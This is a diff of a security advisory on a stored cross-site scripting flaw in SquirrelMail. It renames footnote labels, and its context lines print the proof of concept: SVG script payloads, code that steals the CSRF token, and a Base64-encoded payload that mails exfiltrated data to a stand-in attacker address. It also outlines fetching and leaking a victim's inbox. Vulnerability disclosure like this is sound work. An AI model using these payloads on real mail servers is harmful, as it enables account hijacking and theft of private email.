@@ -34,7 +34,7 @@ Two methods have been devised, to maximize the chances of success, an attacker c
 
 ### No user action required
 
-This solution only works with Firefox and Edge[^firefox_edge] and requires no additional interaction from of the user:
+This solution only works with Firefox and Edge[^firefox-edge] and requires no additional interaction from of the user:
 
 ```xml
 <svg><script xlink:href="data:text/javascript,alert(1)"/></svg>
@@ -43,7 +43,7 @@ This solution only works with Firefox and Edge[^firefox_edge] and requires no ad
 
 Arbitrarily complex code can be deployed by using the `Base64` format of the Data URL scheme.
 
-[^firefox_edge]: Tested with Firefox version 57.0.1 and Edge version 41.16299.15.0. Apparently, this is a [specification](https://www.w3.org/TR/html/syntax.html#start-tags) misinterpretation by Chrome and others.
+[^firefox-edge]: Tested with Firefox version 57.0.1 and Edge version 41.16299.15.0. Apparently, this is a [specification](https://www.w3.org/TR/html/syntax.html#start-tags) misinterpretation by Chrome and others.
 
 ### User action required
 
@@ -91,11 +91,11 @@ if (window.opener) {
 
 ## Limitations
 
-The HTML visualization of messages in SquirrelMail is not enabled by default, users of the stable version need to enable it globally[^html_option] whereas in the development version it can also be toggled for single messages[^html_toggle]. Nowadays HTML emails are sadly widespread so it is reasonable to assume that most users are willing to properly display them.
+The HTML visualization of messages in SquirrelMail is not enabled by default, users of the stable version need to enable it globally[^html-option] whereas in the development version it can also be toggled for single messages[^html-toggle]. Nowadays HTML emails are sadly widespread so it is reasonable to assume that most users are willing to properly display them.
 
-[^html_option]: Options -> Display Preferences -> Show HTML Version by Default; this vulnerability can also be used to set this option once triggered the first time.
+[^html-option]: Options -> Display Preferences -> Show HTML Version by Default; this vulnerability can also be used to set this option once triggered the first time.
 
-[^html_toggle]: Because the "View as HTML" plugin has been included in that version.
+[^html-toggle]: Because the "View as HTML" plugin has been included in that version.
 
 ## Proof of concept
 
@@ -109,7 +109,7 @@ document
     .match(/.*smtoken=([^&]+).*/)[1];
 ```
 
-The administrator may decide to enable a per-action token generation instead[^no_single_token], in this case a token can be obtained with:
+The administrator may decide to enable a per-action token generation instead[^no-single-token], in this case a token can be obtained with:
 
 ```js
 document.querySelector('input[name="smtoken"]').value;
@@ -161,7 +161,7 @@ The following JavaScript payload takes into account the aforementioned considera
 })()
 ```
 
-The payload[^remote_attacker] can be `Base64`-encoded and the HTML message can be crafted as follows:
+The payload[^remote-attacker] can be `Base64`-encoded and the HTML message can be crafted as follows:
 
 ```xml
 <svg><script xlink:href="data:text/javascript;base64,KGZ1bmN0aW9uKCkge2FzeW5jIGZ1bmN0aW9uIHNlbmQoZGF0YSwgdG8pIHtjb25zdCBfd2luZG93ID0gd2luZG93Lm9wZW5lciB8fCB3aW5kb3c7IGNvbnN0IF9kb2N1bWVudCA9IF93aW5kb3cuZG9jdW1lbnQ7IGxldCB0b2tlbjsgdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdhW2hyZWZePSIvc3JjL2RlbGV0ZV9tZXNzYWdlLnBocCJdJykuaHJlZi5tYXRjaCgvLipzbXRva2VuPShbXiZdKykuKi8pWzFdO30gY2F0Y2ggKGVycikge30gdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJzbXRva2VuIl0nKS52YWx1ZTt9IGNhdGNoIChlcnIpIHt9IGNvbnN0IGZvcm0gPSBuZXcgRm9ybURhdGEoKTsgZm9ybS5hcHBlbmQoJ3NtdG9rZW4nLCB0b2tlbik7IGZvcm0uYXBwZW5kKCdzZW5kX3RvJywgdG8pOyBmb3JtLmFwcGVuZCgnYm9keScsIGRhdGEpOyBmb3JtLmFwcGVuZCgnaWRlbnRpdHknLCAnMCcpOyBmb3JtLmFwcGVuZCgnc2VuZCcsICdTZW5kJyk7IGZvcm0uYXBwZW5kKCdzZW5kMScsICdTZW5kJyk7IGZvcm0uYXBwZW5kKCdzZW5kX2J1dHRvbl9jb3VudCcsICcxJyk7IGF3YWl0IGZldGNoKGAke193aW5kb3cubG9jYXRpb24ub3JpZ2lufS9zcmMvY29tcG9zZS5waHBgLCB7Y3JlZGVudGlhbHM6ICdpbmNsdWRlJywgbWV0aG9kOiAnUE9TVCcsIGJvZHk6IGZvcm19KTsgaWYgKHdpbmRvdy5vcGVuZXIpIHtjbG9zZSgpO319IHNlbmQoJ0VYRklMVFJBVEVEX0RBVEEnLCAnYXR0YWNrZXJAbG9jYWxob3N0Jyk7fSkoKQ=="/></svg>
@@ -169,21 +169,21 @@ The payload[^remote_attacker] can be `Base64`-encoded and the HTML message can b
 <svg><a xlink:href="javascript:eval(atob('KGZ1bmN0aW9uKCkge2FzeW5jIGZ1bmN0aW9uIHNlbmQoZGF0YSwgdG8pIHtjb25zdCBfd2luZG93ID0gd2luZG93Lm9wZW5lciB8fCB3aW5kb3c7IGNvbnN0IF9kb2N1bWVudCA9IF93aW5kb3cuZG9jdW1lbnQ7IGxldCB0b2tlbjsgdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdhW2hyZWZePSIvc3JjL2RlbGV0ZV9tZXNzYWdlLnBocCJdJykuaHJlZi5tYXRjaCgvLipzbXRva2VuPShbXiZdKykuKi8pWzFdO30gY2F0Y2ggKGVycikge30gdHJ5IHt0b2tlbiA9IF9kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJzbXRva2VuIl0nKS52YWx1ZTt9IGNhdGNoIChlcnIpIHt9IGNvbnN0IGZvcm0gPSBuZXcgRm9ybURhdGEoKTsgZm9ybS5hcHBlbmQoJ3NtdG9rZW4nLCB0b2tlbik7IGZvcm0uYXBwZW5kKCdzZW5kX3RvJywgdG8pOyBmb3JtLmFwcGVuZCgnYm9keScsIGRhdGEpOyBmb3JtLmFwcGVuZCgnaWRlbnRpdHknLCAnMCcpOyBmb3JtLmFwcGVuZCgnc2VuZCcsICdTZW5kJyk7IGZvcm0uYXBwZW5kKCdzZW5kMScsICdTZW5kJyk7IGZvcm0uYXBwZW5kKCdzZW5kX2J1dHRvbl9jb3VudCcsICcxJyk7IGF3YWl0IGZldGNoKGAke193aW5kb3cubG9jYXRpb24ub3JpZ2lufS9zcmMvY29tcG9zZS5waHBgLCB7Y3JlZGVudGlhbHM6ICdpbmNsdWRlJywgbWV0aG9kOiAnUE9TVCcsIGJvZHk6IGZvcm19KTsgaWYgKHdpbmRvdy5vcGVuZXIpIHtjbG9zZSgpO319IHNlbmQoJ0VYRklMVFJBVEVEX0RBVEEnLCAnYXR0YWNrZXJAbG9jYWxob3N0Jyk7fSkoKQ=='))"><text fill="#0000cc" text-decoration="underline" cursor="pointer" y="1em">CLICK ME</text></a></svg>
 ```
 
-It is likewise possible to retrieve sensitive data by fetching the proper URL[^url_differences], for example:
+It is likewise possible to retrieve sensitive data by fetching the proper URL[^url-differences], for example:
 
 - `/src/right_main.php?showall=1&mailbox=INBOX` to obtain the message list;
 
 - `/src/read_body.php?mailbox=INBOX&passed_id=<messageid>` to obtain the message content.
 
-A possible attack scenario would be to fetch all the message identifiers from the first URL, then use the second to fetch individual messages and finally use the above `send` function to exfiltrate this data[^not_in_poc].
+A possible attack scenario would be to fetch all the message identifiers from the first URL, then use the second to fetch individual messages and finally use the above `send` function to exfiltrate this data[^not-in-poc].
 
-[^no_single_token]: By setting `$do_not_use_single_token` to `TRUE` in `config/config_local.php`.
+[^no-single-token]: By setting `$do_not_use_single_token` to `TRUE` in `config/config_local.php`.
 
-[^remote_attacker]: The destination account does not need to be on the same server, `attacker@localhost` is used just for the sake of the example.
+[^remote-attacker]: The destination account does not need to be on the same server, `attacker@localhost` is used just for the sake of the example.
 
-[^url_differences]: These URLs may differ across versions.
+[^url-differences]: These URLs may differ across versions.
 
-[^not_in_poc]: Not implemented in this PoC for the sake of brevity.
+[^not-in-poc]: Not implemented in this PoC for the sake of brevity.
 
 ### Bonus scenario
 
